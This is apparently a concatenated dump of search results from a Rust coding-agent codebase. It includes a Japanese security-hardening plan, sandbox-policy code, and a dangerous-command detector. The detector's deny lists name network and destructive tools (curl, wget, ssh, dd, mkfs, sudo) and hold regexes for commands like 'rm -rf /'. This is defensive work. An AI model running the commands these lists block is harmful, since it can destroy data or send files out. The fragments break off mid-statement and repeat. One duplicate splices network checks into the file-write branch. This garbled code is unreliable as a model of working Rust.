[codex-rs/core/src/qc/sandboxed_execution.rs](codex-rs/core/src/qc/sandboxed_execution.rs): サンドボックス実装\n- [codex-rs/core/src/tools/sandboxing.rs](codex-rs/core/src/tools/sandboxing.rs): サンドボックス権限\n- 権限昇格の可能性\n\n**攻撃シナリオ**:\n- サンドボックス制限の回避\n- 権限昇格によるシステムアクセス\n- ファイルシステムの制限回避\n\n**修正方針**:\n- サンドボックス制限の強化\n- 権限チェックの追加\n- 監査ログの実装\n\n### 7. ネットワーク通信の脆弱性\n\n**危険箇所**:\n- HTTPS/TLS証明書の検証\n- [codex-rs/otel/src/otel_provider.rs](codex-rs/otel/src/otel_provider.rs): TLS設定\n- HTTPリクエストの検証\n\n**攻撃シナリオ**:\n- 自己署名証明書の受け入れ\n- TLS証明書検証の無効化\n- 中間者攻撃\n\n**修正方針**:\n- 証明書検証の強制\n- TLS 1.3の強制\n- 証明書ピニング\n\n### 8. 依存関係の脆弱性\n\n**危険箇所**:\n- Cargo.toml: Rust依存関係\n- package.json: Node.js依存関係\n- 既知のCVE\n\n**修正方針**:\n- &#96;cargo audit&#96;の実行\n- &#96;npm audit&#96;の実行\n- 依存関係の更新\n\n## 実装手順\n\n### Phase 1: クリティカルな脆弱性の修正\n\n1. **install-binary.jsのコマンドインジェクション修正**\n   - &#96;exec()&#96;の引数を配列形式に変更\n   - パラメータのエスケープ処理\n   - SHA256チェックサム検証の実装\n\n2. **パストラバーサル対策の強化**\n   - ベースディレクトリ制限の追加\n   - シンボリックリンクの検証\n   - パス正規化の強化\n\n3. **RPCサーバーの認証チェック追加**\n   - すべてのRPCメソッドに認証チェック\n   - 権限チェックの実装\n\n### Phase 2: セキュリティ強化\n\n4. **機密情報の保護**\n   - ログマスキングの実装\n   - エラーメッセージのサニタイゼーション\n   - 環境変数の暗号化\n\n5. **ネットワーク通信のセキュリティ強化**\n   - TLS証明書検証の強制\n   - 証明書ピニングの実装\n\n6. **サンドボックス制限の強化**\n   - 権限チェックの追加\n   - 監査ログの実装\n\n### Phase 3: 依存関係とCI/CD\n\n7. **依存関係の脆弱性スキャン**\n   - &#96;cargo audit&#96;の実行と修正\n   - &#96;npm audit&#96;の実行と修正\n\n8. **CI/CDセキュリティ**\n   - シークレット管理の確認\n   - セキュリティスキャンの自動化\n\n## 検証方法\n\n- ペネトレーションテストの実行\n- セキュリティスキャンツールの使用\n- コードレビュー\n- 依存関係のCVEチェック\n\n## 成功基準\n\n- コマンドインジェクションの脆弱性が0件\n- パストラバーサルの脆弱性が0件\n- 認証・認可の不備が0件\n- 既知のCVEが0件\n- セキュリティスキャンツールで警告なし",

{\n                if let Some(path) = parameters.get(\"path\").and_then(|v| v.as_str()) {\n                    self.check_file_read(Path::new(path))?;\n                }\n                if let Some(path) = parameters.get(\"target_file\").and_then(|v| v.as_str()) {\n                    self.check_file_read(Path::new(path))?;\n                }\n            }\n            \"write\" | \"search_replace\" | \"delete_file\" =&gt; {\n                if let Some(path) = parameters.get(\"file_path\").and_then(|v| v.as_str()) {\n                    self.check_file_write(Path::new(path))?;\n                }\n                if let Some(path) = parameters.get(\"target_file\").and_then(|v| v.as_str()) {\n                    self.check_file_write(Path::new(path))?;\n                }\n            }\n            \"web_search\" | \"fetch\" | \"http_request\" =&gt; {\n                if let Some(url) = parameters.get(\"url\").and_then(|v| v.as_str()) {\n                    self.check_network_access(url)?;\n                }\n                if let Some(_url) = parameters.get(\"search_term\").and_then(|v| v.as_str()) {\n                    // For web_search, check if https://* is allowed\n                    self.check_network_access(\"https://search.brave.com\")?;\n                }\n            }\n            \"run_terminal_cmd\" | \"shell\" | \"exec\" =&gt; {\n                if let Some(cmd) = parameters.get(\"command\").and_then(|v| v.as_str()) {\n                    self.check_shell_command(cmd)?;\n                }\n            }\n            _ =&gt; {\n                // Unknown tool - rely on MCP permission check above\n            }\n        }\n\n        Ok(())\n    }\n\n    /// Get permission summary for logging\n    pub fn get_permission_summary(&amp;self) -&gt;         "contents": "//! Sandboxed Execution System (Rust 2024)\n//!\n//! Provides secure command execution with AI-powered destructive command detection\n//! and prevention, featuring internet connectivity controls and macOS-style UX.\n\nuse serde::Deserialize;\nuse serde::Serialize;\nuse std::collections::HashMap;\nuse std::collections::HashSet;\nuse std::sync::Arc;\nuse tokio::sync::RwLock;\nuse tokio::sync::mpsc;\nuse tokio::time::Duration;\n\n/// Sandbox execution mode\n#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]\npub enum SandboxMode {\n    /// Full isolation - no network, limited filesystem\n    Isolated,\n    /// Network access allowed but monitored\n    NetworkIsolated,\n    /// Full access with AI monitoring\n    Supervised,\n    /// macOS-style sandbox with internet access\n    MacOSSandbox,\n}\n\n/// AI security analysis result\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct AISecurityAnalysis {\n    pub command_id: String,\n    pub risk_level: SecurityRiskLevel,\n    pub risk_score: f64,\n    pub detected_threats: Vec&lt;SecurityThreat&gt;,\n    pub mitigation_suggestions: Vec&lt;String&gt;,\n    pub allow_execution: bool,\n    pub requires_approval: bool,\n    pub analysis_timestamp: chrono::DateTime&lt;chrono::Utc&gt;,\n}\n\n/// Security risk levels\n#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]\npub enum SecurityRiskLevel {\n    Safe,\n    Low,\n    Medium,\n    High,\n    Critical,\n}\n\n/// Detected security threats\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct SecurityThreat {\n    pub threat_type: ThreatType,\n    pub description: String,\n    pub severity: SecurityRiskLevel,\n    pub location: Option&lt;String&gt;,\n    pub confidence: f64,\n}\n\n/// Types of security threats\n#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]\npub enum ThreatType {\n    DestructiveFileOperation,\n    NetworkAttack,\n    PrivilegeEscalation,\n    DataExfiltration,\n    MalwareExecution,\n    UnauthorizedAccess,\n    ResourceExhaustion,\n}\n\n/// Sandbox execution request",

        "contents": "    async fn start_sandboxed_execution(\n        &amp;self,\n        request: SandboxExecutionRequest,\n        security_analysis: Option&lt;AISecurityAnalysis&gt;,\n    ) {\n        let result_sender = self.result_sender.clone();\n        let config = self.config.clone();\n\n        tokio::spawn(async move {\n            let start_time = tokio::time::Instant::now();\n\n            // Execute based on sandbox mode\n            let result = match request.sandbox_mode {\n                SandboxMode::Isolated =&gt; Self::execute_isolated(request, &amp;config).await,\n                SandboxMode::NetworkIsolated =&gt; {\n                    Self::execute_network_isolated(request, &amp;config).await\n                }\n                SandboxMode::Supervised =&gt; Self::execute_supervised(request, &amp;config).await,\n                SandboxMode::MacOSSandbox =&gt; Self::execute_macos_sandbox(request, &amp;config).await,\n            };\n\n            let execution_time = start_time.elapsed().as_millis() as u64;\n\n            // Create final result\n            let execution_result = SandboxExecutionResult {\n                request_id: result.request_id,\n                success: result.success,\n                exit_code: result.exit_code,\n                stdout: result.stdout,\n                stderr: result.stderr,\n                execution_time_ms: execution_time,\n                resources_used: result.resources_used,\n                network_activity: result.network_activity,\n                security_events: result.security_events,\n                ai_analysis: security_analysis,\n                sandbox_mode_used: request.sandbox_mode,\n                completed_at: chrono::Utc::now(),\n            };\n\n            // Send result\n            let _ = result_sender.send(execution_result);\n        });\n    }\n\n    /// Execute in isolated sandbox (no network, limited filesystem)\n    async fn execute_isolated(\n        request: SandboxExecutionRequest,\n        _config: &amp;SandboxConfig,\n    ) -&gt;         "contents": "    pub async fn delegate(\n        &amp;self,\n        agent_name: &amp;str,\n        goal: &amp;str,\n        inputs: HashMap&lt;String, String&gt;,\n        budget: Option&lt;usize&gt;,\n        deadline: Option&lt;u64&gt;,\n    ) -&gt; Result&lt;AgentResult&gt; {\n        info!(\"Delegating to agent '{}': {}\", agent_name, goal);\n\n        // エージェント定義を読み込み\n        let agent_def = {\n            let mut loader = self.loader.write().await;\n            loader\n                .load_by_name(agent_name)\n                .with_context(|| format!(\"Failed to load agent '{agent_name}'\"))?\n        };\n\n        // 共有情報を入力へ取り込む\n        let mut inputs = inputs;\n        let shared_context_snapshot = self.collaboration_store.get_all_context();\n        if !shared_context_snapshot.is_empty()\n            &amp;&amp; let Ok(serialized) = serde_json::to_string(&amp;shared_context_snapshot)\n        {\n            inputs.insert(\"shared_context\".to_string(), serialized);\n        }\n\n        let prior_results_snapshot = self.collaboration_store.get_all_results();\n        if !prior_results_snapshot.is_empty()\n            &amp;&amp; let Ok(serialized) = serde_json::to_string(&amp;prior_results_snapshot)\n        {\n            inputs.insert(\"collaboration_results\".to_string(), serialized);\n        }\n\n        // 予算を設定\n        if let Some(budget) = budget {\n            self.budgeter.set_agent_limit(agent_name, budget)?;\n        } else {\n            // デフォルト予算はコンテキストポリシーから取得\n            self.budgeter\n                .set_agent_limit(agent_name, agent_def.policies.context.max_tokens)?;\n        }\n\n        // 実行ステータスを更新\n        {\n            let mut running = self.running_agents.write().await;\n            running.insert(agent_name.to_string(), AgentStatus::Running);\n        }\n\n        // 実行開始\n        let start_time = Instant::now();\n        let start_timestamp = chrono::Utc::now().to_rfc3339();\n\n        // 監査ログ: エージェント開始\n        let _ = log_audit_event(AuditEvent::new(\n            agent_name.to_string(),\n            AuditEventType::AgentExecution",

        "contents": "    async fn generate_security_recommendations(\n        &amp;self,\n        analysis: &amp;AISecurityAnalysis,\n    ) -&gt; Vec&lt;String&gt; {\n        let mut recommendations = analysis.mitigation_suggestions.clone();\n\n        // Add general recommendations based on risk level\n        match analysis.risk_level {\n            SecurityRiskLevel::Critical =&gt; {\n                recommendations.push(\n                    \"🚫 CRITICAL: This command is blocked due to high security risk\".to_string(),\n                );\n                recommendations.push(\n                    \"Consider alternative approaches that don't involve destructive operations\"\n                        .to_string(),\n                );\n                recommendations.push(\"Consult with security team before proceeding\".to_string());\n            }\n            SecurityRiskLevel::High =&gt; {\n                recommendations\n                    .push(\"⚠️ HIGH RISK: Manual review required before execution\".to_string());\n                recommendations.push(\"Execute in isolated environment first\".to_string());\n                recommendations.push(\"Ensure backups are available\".to_string());\n            }\n            SecurityRiskLevel::Medium =&gt; {\n                recommendations.push(\"⚡ MEDIUM RISK: Execute with caution\".to_string());\n                recommendations.push(\"Monitor execution closely\".to_string());\n                recommendations.push(\"Have rollback plan ready\".to_string());\n            }\n            SecurityRiskLevel::Low =&gt; {\n                recommendations.push(\"✅ LOW RISK: Generally safe to execute\".to_string());\n                recommendations.push(\"Standard monitoring recommended\".to_string());\n            }\n            SecurityRiskLevel::Safe =&gt; {\n                recommendations.push(\"✅ SAFE: No security concerns detected\".to_string());\n            }\n        }\n\n        recommendations\n    }\n}\n\nimpl AISandboxExecutor {\n    /// Create new AI-powered sandbox executor",

        "contents": "use std::path::Path;\n\nuse once_cell::sync::Lazy;\nuse regex::Regex;\nuse shlex::split as shlex_split;\nuse url::Url;\n\npub fn is_dangerous_command_windows(command: &amp;[String]) -&gt; bool {\n    // Prefer structured parsing for PowerShell/CMD so we can spot URL-bearing\n    // invocations of ShellExecute-style entry points before falling back to\n    // simple argv heuristics.\n    if is_dangerous_powershell(command) {\n        return true;\n    }\n\n    if is_dangerous_cmd(command) {\n        return true;\n    }\n\n    is_direct_gui_launch(command)\n}\n\nfn is_dangerous_powershell(command: &amp;[String]) -&gt; bool {\n    let Some((exe, rest)) = command.split_first() else {\n        return false;\n    };\n    if !is_powershell_executable(exe) {\n        return false;\n    }\n    // Parse the PowerShell invocation to get a flat token list we can scan for\n    // dangerous cmdlets/COM calls plus any URL-looking arguments. This is a\n    // best-effort shlex split of the script text, not a full PS parser.\n    let Some(parsed) = parse_powershell_invocation(rest) else {\n        return false;\n    };\n\n    let tokens_lc: Vec&lt;String&gt; = parsed\n        .tokens\n        .iter()\n        .map(|t| t.trim_matches('\\'').trim_matches('\"').to_ascii_lowercase())\n        .collect();\n    let has_url = args_have_url(&amp;parsed.tokens);\n\n    if has_url\n        &amp;&amp; tokens_lc.iter().any(|t| {\n            matches!(\n                t.as_str(),\n                \"start-process\" | \"start\" | \"saps\" | \"invoke-item\" | \"ii\"\n            ) || t.contains(\"start-process\")\n                || t.contains(\"invoke-item\")\n        })\n    {\n        return true;\n    }\n\n    if has_url\n        &amp;&amp; tokens_lc\n            .iter()\n            .any(|t| t.contains(\"shellexecute\") || t.contains(\"shell.application\"))\n    {\n        return true;\n    }\n\n    if let Some(first) = tokens_lc.first()",

        "contents": "    {\n        return true;\n    }\n\n    if let Some(first) = tokens_lc.first() {\n        // Legacy ShellExecute path via url.dll\n        if first == \"rundll32\"\n            &amp;&amp; tokens_lc\n                .iter()\n                .any(|t| t.contains(\"url.dll,fileprotocolhandler\"))\n            &amp;&amp; has_url\n        {\n            return true;\n        }\n        if first == \"mshta\" &amp;&amp; has_url {\n            return true;\n        }\n        if is_browser_executable(first) &amp;&amp; has_url {\n            return true;\n        }\n        if matches!(first.as_str(), \"explorer\" | \"explorer.exe\") &amp;&amp; has_url {\n            return true;\n        }\n    }\n\n    false\n}\n\nfn is_dangerous_cmd(command: &amp;[String]) -&gt; bool {\n    let Some((exe, rest)) = command.split_first() else {\n        return false;\n    };\n    let Some(base) = executable_basename(exe) else {\n        return false;\n    };\n    if base != \"cmd\" &amp;&amp; base != \"cmd.exe\" {\n        return false;\n    }\n\n    let mut iter = rest.iter();\n    for arg in iter.by_ref() {\n        let lower = arg.to_ascii_lowercase();\n        match lower.as_str() {\n            \"/c\" | \"/r\" | \"-c\" =&gt; break,\n            _ if lower.starts_with('/') =&gt; continue,\n            // Unknown tokens before the command body =&gt; bail.\n            _ =&gt; return false,\n        }\n    }\n\n    let Some(first_cmd) = iter.next() else {\n        return false;\n    };\n    // Classic &#96;cmd /c start https://...&#96; ShellExecute path.\n    if !first_cmd.eq_ignore_ascii_case(\"start\") {\n        return false;\n    }\n    let remaining: Vec&lt;String&gt; = iter.cloned().collect();\n    args_have_url(&amp;remaining)\n}\n\nfn is_direct_gui_launch(command: &amp;[String]) -&gt;",

        "contents": "    }\n}\n\nfn command_might_be_dangerous(command: &amp;[String]) -&gt; bool {\n    let Some(cmd0) = command.first().map(String::as_str) else {\n        return false;\n    };\n\n    match cmd0 {\n        \"rm\" =&gt; matches!(command.get(1).map(String::as_str), Some(\"-f\" | \"-rf\")),\n        \"sudo\" =&gt; true,\n        cmd if cmd.ends_with(\"git\") || cmd == \"git\" =&gt; {\n            matches!(command.get(1).map(String::as_str), Some(\"reset\" | \"rm\"))\n        }\n        _ =&gt; false,\n    }\n}\n\nfn is_known_safe_command(command: &amp;[String]) -&gt; bool {\n    let Some(cmd0) = command.first().map(String::as_str) else {\n        return false;\n    };\n\n    matches!(cmd0, \"ls\" | \"pwd\" | \"echo\" | \"cat\" | \"true\" | \"false\")\n}\n\n/// Terminal Manager\npub struct TerminalManager {\n    sessions: HashMap&lt;String, TerminalSession&gt;,\n}\n\nimpl TerminalManager {\n    pub fn new() -&gt; Self {\n        Self {\n            sessions: HashMap::new(),\n        }\n    }\n\n    /// Create a new terminal session\n    pub fn create_session(\n        &amp;mut self,\n        working_directory: PathBuf,\n        network: Option&lt;VirtualNetwork&gt;,\n    ) -&gt; String {\n        let session = TerminalSession::new(working_directory, network);\n        let session_id = session.session_id.clone();\n        self.sessions.insert(session_id.clone(), session);\n        session_id\n    }\n\n    /// Get a session\n    pub fn get_session(&amp;self, session_id: &amp;str) -&gt; Option&lt;&amp;TerminalSession&gt; {\n        self.sessions.get(session_id)\n    }\n\n    /// Get a mutable session\n    pub fn get_session_mut(&amp;mut self, session_id: &amp;str) -&gt; Option&lt;&amp;mut TerminalSession&gt; {\n        self.sessions.get_mut(session_id)\n    }\n\n    /// Remove a session\n    pub fn remove_session(&amp;mut self, session_id: &amp;str) {\n        self.sessions.remove(session_id);\n    }\n\n    /// List all sessions\n    pub fn list_sessions(&amp;self) -&gt; Vec&lt;&amp;TerminalSession&gt; {\n        self.sessions.values().collect()\n    }\n}\n\nimpl Default for TerminalManager {\n    fn default() -&gt; Self {\n        Self::new()\n    }\n}",

false,\n    }\n}\n\nfn is_known_safe_command(command: &amp;[String]) -&gt; bool {\n    let Some(cmd0) = command.first().map(String::as_str) else {\n        return false;\n    };\n\n    matches!(cmd0, \"ls\" | \"pwd\" | \"echo\" | \"cat\" | \"true\" | \"false\")\n}\n\n/// Terminal Manager\npub struct TerminalManager {\n    sessions: HashMap&lt;String, TerminalSession&gt;,\n}\n\nimpl TerminalManager {\n    pub fn new() -&gt; Self {\n        Self {\n            sessions: HashMap::new(),\n        }\n    }\n\n    /// Create a new terminal session\n    pub fn create_session(\n        &amp;mut self,\n        working_directory: PathBuf,\n        network: Option&lt;VirtualNetwork&gt;,\n    ) -&gt;         "contents": "}\n\nimpl SecurityMonitor {\n    pub fn new() -&gt; Self {\n        let mut dangerous_commands = HashSet::new();\n        dangerous_commands.extend(\n            [\n                \"rm\", \"rmdir\", \"del\", \"erase\", \"format\", \"fdisk\", \"mkfs\", \"dd\", \"shred\", \"wipe\",\n                \"srm\", \"sudo\", \"su\", \"chmod +x\", \"curl\", \"wget\", \"ssh\", \"scp\", \"ftp\", \"telnet\",\n            ]\n            .iter()\n            .map(|s| s.to_string()),\n        );\n\n        let dangerous_patterns = vec![\n            regex::Regex::new(r\"rm\\s+-rf\\s+/\").unwrap(),\n            regex::Regex::new(r\"dd\\s+if=\").unwrap(),\n            regex::Regex::new(r\"&gt;\\s*/dev/\").unwrap(),\n            regex::Regex::new(r\"chmod\\s+777\").unwrap(),\n        ];\n\n        Self {\n            dangerous_commands,\n            dangerous_patterns,\n            file_deletion_prevention: true,\n        }\n    }\n\n    pub fn is_command_safe(&amp;self, command: &amp;str, args: &amp;[String]) -&gt; Result&lt;bool&gt; {\n        let full_command = format!(\"{} {}\", command, args.join(\" \"));\n\n        // Check dangerous commands\n        if self.dangerous_commands.contains(command) {\n            return Ok(false);\n        }\n\n        // Check dangerous patterns\n        for pattern in &amp;self.dangerous_patterns {\n            if pattern.is_match(&amp;full_command) {\n                return Ok(false);\n            }\n        }\n\n        Ok(true)\n    }\n\n    pub fn is_file_operation_safe(&amp;self, operation: &amp;FileOperation) -&gt; bool {\n        match operation {\n            FileOperation::Delete(_) if self.file_deletion_prevention =&gt; false,\n            FileOperation::Write(path) if self.is_system_file(path) =&gt; false,\n            _ =&gt; true,\n        }\n    }\n\n    fn is_system_file(&amp;self, path: &amp;Path) -&gt; bool",

Dangerous commands cannot be executed even in YOLO mode for security reasons.\",\n            command_str\n        ),\n        data: Some(serde_json::json!({\n            \"blocked\": true,\n            \"reason\": \"dangerous_command\",\n            \"command\": command_str\n        })),\n    });\n}\n&#96;&#96;&#96;\n\n### Phase 5.5: 仮想OSターミナルでのブロック実装\n\n**ファイル**: &#96;codex-rs/core/src/virtualization/terminal.rs&#96;\n\n**変更内容**:\n- &#96;execute_command&#96;メソッドで、危険なコマンドをチェックしてブロック\n- エラーメッセージを更新して、YOLOモードでもブロックされることを明記\n\n**実装詳細**:\n&#96;&#96;&#96;rust\n// YOLOモードでも危険なコマンドは完全にブロック\nif command_might_be_dangerous(&amp;command) {\n    warn!(\"Dangerous command blocked (even in YOLO mode): {:?}\", command);\n    let result = TerminalResult {\n        exit_code: 1,\n        stdout: String::new(),\n        stderr: format!(\n            \"Error: Dangerous command blocked for security reasons (even in YOLO mode): {:?}.             "line": 55

        },
        "contents": "# 仮想OSターミナル実装完了\n\n**日時**: 2025-11-25 03:55:19  \n**タスク**: 仮想OSからターミナル経由で各種インストール済みCLIを呼び出し、危険なシェルコマンドをブロック\n\n---\n\n## 概要\n\n仮想OS環境内でターミナル経由で各種インストール済みCLIを呼び出せる機能を実装しました。既存のコマンド安全性チェック機能を統合し、危険なシェルコマンドを明示的にブロックします。\n\n## 実装内容\n\n### 1. &#96;terminal.rs&#96;の実装\n\n**ファイル**: &#96;codex-rs/core/src/virtualization/terminal.rs&#96; (新規作成)\n\n**実装内容**:\n- 仮想OS環境内でのターミナルセッション管理\n- CLIコマンド実行機能\n- 危険なコマンドの検出とブロック\n- インストール済みCLIの検出機能\n- コマンド履歴管理\n- ネットワークアクセス制御との統合\n\n**主な機能**:\n- &#96;TerminalSession&#96;: ターミナルセッションの管理\n- &#96;TerminalManager&#96;: 複数セッションの管理\n- &#96;execute_command()&#96;: コマンド実行（安全性チェック付き）\n- &#96;list_available_commands()&#96;: インストール済みCLIの一覧取得\n- &#96;get_history()&#96;: コマンド履歴の取得\n- &#96;change_directory()&#96;: 作業ディレクトリの変更\n\n**安全性チェック**:\n- &#96;command_might_be_dangerous()&#96;: 危険なコマンドの検出\n- &#96;is_known_safe_command()&#96;: 安全なコマンドの確認\n- ネットワークアクセス制御との統合\n\n**ブロックされる危険なコマンド例**:\n- &#96;git reset&#96; / &#96;git rm&#96;: Git履歴の破壊\n- &#96;rm -rf /&#96;: システムファイルの削除\n- &#96;rm -f&#96;: 強制削除\n- &#96;sudo&#96;: 権限昇格\n- PowerShell/CMD経由のURL起動\n- ブラウザ経由のURL起動\n\n**許可される安全なコマンド例**:\n- &#96;git status&#96; / &#96;git log&#96; / &#96;git diff&#96;: Git情報取得\n- &#96;ls&#96; / &#96;cd&#96; / &#96;pwd&#96;: ファイルシステム操作（読み取り）\n- &#96;cat&#96; / &#96;grep&#96; / &#96;head&#96; / &#96;tail&#96;: ファイル読み取り\n- &#96;cargo check&#96;: Rustプロジェクトのチェック\n- &#96;node&#96; / &#96;python&#96; / &#96;go&#96;: 言語ランタイムの実行\n\n### 2. CLI統合",

        "contents": "impl WritableRoot {\n    pub fn is_path_writable(&amp;self, path: &amp;Path) -&gt; bool {\n        // Check if the path is under the root.\n        if !path.starts_with(&amp;self.root) {\n            return false;\n        }\n\n        // Check if the path is under any of the read-only subpaths.\n        for subpath in &amp;self.read_only_subpaths {\n            if path.starts_with(subpath) {\n                return false;\n            }\n        }\n\n        true\n    }\n}\n\nimpl FromStr for SandboxPolicy {\n    type Err = serde_json::Error;\n\n    fn from_str(s: &amp;str) -&gt; Result&lt;Self, Self::Err&gt; {\n        serde_json::from_str(s)\n    }\n}\n\nimpl SandboxPolicy {\n    /// Returns a policy with read-only disk access and no network.\n    pub fn new_read_only_policy() -&gt; Self {\n        SandboxPolicy::ReadOnly\n    }\n\n    /// Returns a policy that can read the entire disk, but can only write to\n    /// the current working directory and the per-user tmp dir on macOS. It does\n    /// not allow network access.\n    pub fn new_workspace_write_policy() -&gt; Self {\n        SandboxPolicy::WorkspaceWrite {\n            writable_roots: vec![],\n            network_access: false,\n            exclude_tmpdir_env_var: false,\n            exclude_slash_tmp: false,\n        }\n    }\n\n    /// Always returns &#96;true&#96;; restricting read access is not supported.\n    pub fn has_full_disk_read_access(&amp;self) -&gt; bool {\n        true\n    }\n\n    pub fn has_full_disk_write_access(&amp;self) -&gt; bool {\n        match self {\n            SandboxPolicy::DangerFullAccess =&gt; true,\n            SandboxPolicy::ExternalSandbox { .. } =&gt; true,\n            SandboxPolicy::ReadOnly =&gt; false,\n            SandboxPolicy::WorkspaceWrite { .. } =&gt; false,\n        }\n    }\n\n    pub fn has_full_network_access(&amp;self) -&gt; bool",

Result&lt;()&gt; {\n    if !sandbox_policy.has_full_network_access() {\n        install_network_seccomp_filter_on_current_thread()?;\n    }\n\n    if !sandbox_policy.has_full_disk_write_access() {\n        let writable_roots = sandbox_policy\n            .get_writable_roots_with_cwd(cwd)\n            .into_iter()\n            .map(|writable_root| writable_root.root)\n            .collect();\n        install_filesystem_landlock_rules_on_current_thread(writable_roots)?;\n    }\n\n    // TODO(ragona): Add appropriate restrictions if\n    // &#96;sandbox_policy.has_full_disk_read_access()&#96;         "contents": "}\n\nimpl SecurityMonitor {\n    pub fn new() -&gt; Self {\n        let mut dangerous_commands = HashSet::new();\n        dangerous_commands.extend(\n            [\n                \"rm\", \"rmdir\", \"del\", \"erase\", \"format\", \"fdisk\", \"mkfs\", \"dd\", \"shred\", \"wipe\",\n                \"srm\", \"sudo\", \"su\", \"chmod +x\", \"curl\", \"wget\", \"ssh\", \"scp\", \"ftp\", \"telnet\",\n            ]\n            .iter()\n            .map(|s| s.to_string()),\n        );\n\n        let dangerous_patterns = vec![\n            regex::Regex::new(r\"rm\\s+-rf\\s+/\").unwrap(),\n            regex::Regex::new(r\"dd\\s+if=\").unwrap(),\n            regex::Regex::new(r\"&gt;\\s*/dev/\").unwrap(),\n            regex::Regex::new(r\"chmod\\s+777\").unwrap(),\n        ];\n\n        Self {\n            dangerous_commands,\n            dangerous_patterns,\n            file_deletion_prevention: true,\n        }\n    }\n\n    pub fn is_command_safe(&amp;self, command: &amp;str, args: &amp;[String]) -&gt; Result&lt;bool&gt; {\n        let full_command = format!(\"{} {}\", command, args.join(\" \"));\n\n        // Check dangerous commands\n        if self.dangerous_commands.contains(command) {\n            return Ok(false);\n        }\n\n        // Check dangerous patterns\n        for pattern in &amp;self.dangerous_patterns {\n            if pattern.is_match(&amp;full_command) {\n                return Ok(false);\n            }\n        }\n\n        Ok(true)\n    }\n\n    pub fn is_file_operation_safe(&amp;self, operation: &amp;FileOperation) -&gt; bool {\n        match operation {\n            FileOperation::Delete(_) if self.file_deletion_prevention =&gt; false,\n            FileOperation::Write(path) if self.is_system_file(path) =&gt; false,\n            _ =&gt; true,\n        }\n    }\n\n    fn is_system_file(&amp;self, path: &amp;Path) -&gt; bool",

{\n                if let Some(path) = parameters.get(\"path\").and_then(|v| v.as_str()) {\n                    self.check_file_read(Path::new(path))?;\n                }\n                if let Some(path) = parameters.get(\"target_file\").and_then(|v| v.as_str()) {\n                    self.check_file_read(Path::new(path))?;\n                }\n            }\n            \"write\" | \"search_replace\" | \"delete_file\" =&gt; {\n                if let Some(url) = parameters.get(\"url\").and_then(|v| v.as_str()) {\n                    self.check_network_access(url)?;\n                }\n                if let Some(_url) = parameters.get(\"search_term\").and_then(|v| v.as_str()) {\n                    // For web_search, check if https://* is allowed\n                    self.check_network_access(\"https://search.brave.com\")?;\n                }\n            }\n            \"run_terminal_cmd\" | \"shell\" | \"exec\" =&gt;           },
          "endPosition": {
            "line": 127
          }
        },
        "contents": "warn_before_expiry_days = 14  # 14日前に警告\n\n[security.signing]\n# Ed25519署名鍵（メッセージ署名用）\nalgorithm = \"Ed25519\"\nsigning_key = \"~/.codex/keys/ed25519-signing\"\nsigning_public_key = \"~/.codex/keys/ed25519-signing.pub\"\n\n[security.encryption]\n# ペイロード暗号化\nalgorithm = \"AES-256-GCM\"\nkey_derivation = \"HKDF-SHA256\"\nkey_rotation_days = 90\n\n[security.replay_protection]\n# リプレイ攻撃対策\nenabled = true\nnonce_store = \"redis\"  # \"redis\" or \"memory\" (for testing)\nredis_url = \"redis://localhost:6379\"\ntimestamp_tolerance_sec = 300  # 5分以内のメッセージのみ受け入れ\n\n[security.rate_limiting]\n# Rate Limiting（DDoS対策）\nenabled = true\nmax_requests_per_sec = 10.0\nburst_size = 20\n\n# ==================== Sandbox ====================\n[sandbox]\ndefault_mode = \"read-only\"  # デフォルトは読み取り専用\n\n[approval]\npolicy = \"on-request\"  # 危険な操作は都度承認\n\n# ==================== エージェント通信セキュリティ ====================\n[agent_security]\nencryption_enabled = true\nsigning_enabled = true\n\n[agent_security.encryption]\nalgorithm = \"AES-256-GCM\"\nkey_derivation = \"HKDF-SHA256\"\n\n[agent_security.signing]\nalgorithm = \"Ed25519\"\nkeys_directory = \"~/.codex/keys/agents\"\n\n# エージェント信頼関係（RBAC: Role-Based Access Control）\n[agent_security.trust]\n# 特権エージェント（すべてのエージェントと通信可能）\nprivileged_agents = [\"SecurityExpert\"]\n\n# CodeExpert: 限定的な通信\n[agent_security.trust.CodeExpert]\ncan_communicate_with = [\"General\", \"TestingExpert\", \"DocsExpert\"]\npermissions = [\"read\", \"write\"]\n\n# SecurityExpert: すべてのエージェントと通信可能（特権）\n[agent_security.trust.SecurityExpert]\ncan_communicate_with = [\"*\"]  # ワイルドカード\npermissions = [\"read\", \"write\", \"execute\", \"admin\"]\n\n# TestingExpert: 制限あり\n[agent_security.trust.TestingExpert]\ncan_communicate_with = [\"CodeExpert\", \"General\"]\npermissions = [\"read\", \"write\"]\n\n# DeepResearcher: 外部アクセス可能",

        "contents": "(version 1)\n\n; inspired by Chrome's sandbox policy:\n; https://source.chromium.org/chromium/chromium/src/+/main:sandbox/policy/mac/common.sb;l=273-319;drc=7b3962fe2e5fc9e2ee58000dc8fbf3429d84d3bd\n;         "contents": "fn is_write_patch_constrained_to_writable_paths(\n    action: &amp;ApplyPatchAction,\n    sandbox_policy: &amp;SandboxPolicy,\n    cwd: &amp;Path,\n) -&gt; bool {\n    // Early‑exit if there are no declared writable roots.\n    let writable_roots = match sandbox_policy {\n        SandboxPolicy::ReadOnly =&gt; {\n            return false;\n        }\n        SandboxPolicy::DangerFullAccess | SandboxPolicy::ExternalSandbox { .. } =&gt; {\n            return true;\n        }\n        SandboxPolicy::WorkspaceWrite { .. } =&gt; sandbox_policy.get_writable_roots_with_cwd(cwd),\n    };\n\n    // Normalize a path by removing &#96;.&#96; and resolving &#96;..&#96; without touching the\n    // filesystem (works even if the file does not exist).\n    fn normalize(path: &amp;Path) -&gt; Option&lt;PathBuf&gt; {\n        let mut out = PathBuf::new();\n        for comp in path.components() {\n            match comp {\n                Component::ParentDir =&gt; {\n                    out.pop();\n                }\n                Component::CurDir =&gt; { /* skip */ }\n                other =&gt; out.push(other.as_os_str()),\n            }\n        }\n        Some(out)\n    }\n\n    // Determine whether &#96;path&#96; is inside **any** writable root. Both &#96;path&#96;\n    // and roots are converted to absolute, normalized forms before the\n    // prefix check.\n    let is_path_writable = |p: &amp;PathBuf| {\n        let abs = resolve_path(cwd, p);\n        let abs = match normalize(&amp;abs) {\n            Some(v) =&gt; v,\n            None =&gt; return false,\n        };\n\n        